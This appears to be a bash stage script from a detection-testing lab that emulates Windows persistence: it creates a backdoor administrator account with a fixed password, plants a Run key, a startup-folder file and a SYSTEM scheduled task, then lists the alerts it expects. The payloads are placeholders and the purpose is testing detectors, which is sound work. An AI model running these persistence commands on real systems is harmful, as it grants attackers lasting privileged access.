#!/usr/bin/env bash
# Stage 5 — persistence as SYSTEM: backdoor account, local admin, Run key,
# startup-folder drop, scheduled-task beacon.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

need python3 "EncodedCommand helper"

check_target

say "creating a backdoor account and adding it to Administrators"
root 'net user backdoor S3cr3tB4ckd00r /add'
root 'net localgroup Administrators backdoor /add'

say "planting a HKLM Run key"
root "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v DbCheck /t REG_SZ /d cmd.exe /f"

say "dropping a startup-folder beacon"
root_ps "Set-Content -Path 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dbcheck.bat' -Encoding ASCII -Value 'rem elmer-lab'"

say "dropping a certutil beacon scheduled task (fires every 2 minutes)"
root "schtasks /create /tn DbCheck /sc minute /mo 2 /ru SYSTEM /rl HIGHEST /f /tr certutil.exe"

note "expected on the target:"
note "  process    CRITICAL persist-netuser — net user /add and net localgroup /add"
note "  auth       CRITICAL user account created (4720) + added to Administrators (4732)"
note "  process    HIGH     persist-schtasks — schtasks /create"
note "  persistence HIGH    new Run key (FIM poll within ~5s) + startup folder item"
note "  persistence         new account / task / Run key / admin in the next 5-minute sweep"
note "  process    HIGH     lol-certutil re-firing every 2 minutes (task beacon)"
